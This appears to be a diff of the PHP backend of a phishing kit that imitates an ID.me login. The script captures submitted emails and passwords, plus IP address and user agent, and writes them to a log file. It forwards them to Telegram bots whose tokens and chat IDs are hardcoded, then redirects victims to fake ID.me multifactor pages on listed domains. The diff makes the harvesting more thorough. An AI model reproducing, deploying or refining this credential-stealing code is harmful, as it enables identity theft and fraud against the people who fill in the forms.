@@ -1,11 +1,6 @@
 <?php
-// =========================================
-// 🌐 UNIVERSAL MULTI-SITE FORM HANDLER
-// ✅ Using HTTP_REFERER to detect form source domain
-// =========================================
+ob_start();
 
-
-// === Configuration: Replace with real domains ===
 $site_map = [
     'upstartloan.rf.gd' => [
         'bots' => [
@@ -15,7 +10,7 @@ $site_map = [
         'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
     ],
 
-'illuminatigroup.world' => [
+    'illuminatigroup.world' => [
         "bots" => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
             ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
@@ -46,69 +41,85 @@ $site_map = [
         ],
         "redirect" => "https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
     ],
-
-
-    // Add more sites...
 ];
 
+$log_file = __DIR__ . '/submission_log.txt';
 
-
-$log_file = 'submission_log.txt';
-
-// === Logging Function ===
 function logToFile($data, $file) {
     $entry = "[" . date("Y-m-d H:i:s") . "] " . $data . "\n";
     file_put_contents($file, $entry, FILE_APPEND);
 }
 
-// === Telegram Sender ===
 function sendToBots($message, $bots) {
     foreach ($bots as $bot) {
+        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
+        
         $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
         $data = [
             'chat_id' => $bot['chat_id'],
             'text' => $message,
             'parse_mode' => 'Markdown'
         ];
+        
         $ch = curl_init();
         curl_setopt_array($ch, [
             CURLOPT_URL => $url,
             CURLOPT_POST => true,
             CURLOPT_POSTFIELDS => $data,
-            CURLOPT_RETURNTRANSFER => true
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 30
         ]);
         curl_exec($ch);
         curl_close($ch);
     }
 }
 
-// === Main Logic ===
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    // Use HTTP_REFERER to determine where the form was hosted
     $referer = $_SERVER['HTTP_REFERER'] ?? '';
-    $parsed  = parse_url($referer);
-    $domain  = $parsed['host'] ?? 'unknown-origin';
-
-    $useremail    = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
+    $parsed = parse_url($referer);
+    $domain = $parsed['host'] ?? 'unknown-origin';
+    
+    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
     $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
-    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
-    $timestamp    = date("Y-m-d H:i:s");
-
-    $msg = "📝 *New Submission from $domain*\n\n".
-           "👤 *Email:* $useremail\n".
-           "🔑 *Password:* $userpassword\n".
-           "🌐 *IP:* $ip\n".
-           "⏰ *Time:* $timestamp";
-
-    logToFile("[$domain] $useremail | $userpassword | $ip", $log_file);
-
+    $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';
+    
+    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
+          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
+          $_SERVER['HTTP_X_FORWARDED'] ?? 
+          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
+          $_SERVER['HTTP_FORWARDED'] ?? 
+          $_SERVER['REMOTE_ADDR'] ?? 
+          'unknown';
+    
+    if (strpos($ip, ',') !== false) {
+        $ips = explode(',', $ip);
+        $ip = trim($ips[0]);
+    }
+    
+    $timestamp = date("Y-m-d H:i:s");
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    
+    $message = "🔐 *ID.me Login Submission*\n\n" .
+               "📧 *Email:* `$useremail`\n" .
+               "🔑 *Password:* `$userpassword`\n" .
+               "💾 *Remember Me:* $remember_me\n" .
+               "🌐 *Domain:* $domain\n" .
+               "📡 *IP:* `$ip`\n" .
+               "🕒 *Time:* $timestamp\n" .
+               "🔍 *User Agent:* " . substr($user_agent, 0, 100);
+    
+    logToFile("[$domain] Email: $useremail | Pass: $userpassword | IP: $ip | UA: $user_agent", $log_file);
+    
     if (isset($site_map[$domain])) {
         $site_config = $site_map[$domain];
-        sendToBots($msg, $site_config['bots']);
+        sendToBots($message, $site_config['bots']);
+        
+        ob_end_clean();
         header("Location: " . $site_config['redirect']);
         exit;
     } else {
         logToFile("❌ Unauthorized domain: $domain", $log_file);
+        http_response_code(403);
         exit("Unauthorized domain");
     }
 }
